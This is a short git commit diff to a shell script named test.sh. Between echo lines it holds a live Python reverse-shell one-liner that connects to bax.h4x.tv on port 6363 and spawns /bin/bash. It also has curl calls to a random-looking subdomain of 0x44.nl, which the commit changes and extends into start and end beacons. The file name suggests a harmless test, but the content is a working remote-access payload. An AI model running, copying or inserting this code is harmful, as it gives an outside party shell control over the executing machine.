4725a945362e043c205cbe7278173c66a0bee353
zrthstr <1923548+zrthstr@users.noreply.github.com>
2026-09-15 09:14:14 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -2,11 +2,13 @@
 
 echo aaa
 
-curl http://qhyozoskzitihodxwgcqj6e0cldhzw4cj.0x44.nl
+curl http://qhyozoskzitihodxwgcqj6e0cldhzw4cj.0x44.nl/start
 
 echo bbb
 
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("bax.h4x.tv",6363));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 
+
+curl http://qhyozoskzitihodxwgcqj6e0cldhzw4cj.0x44.nl/end
 
 echo ccc
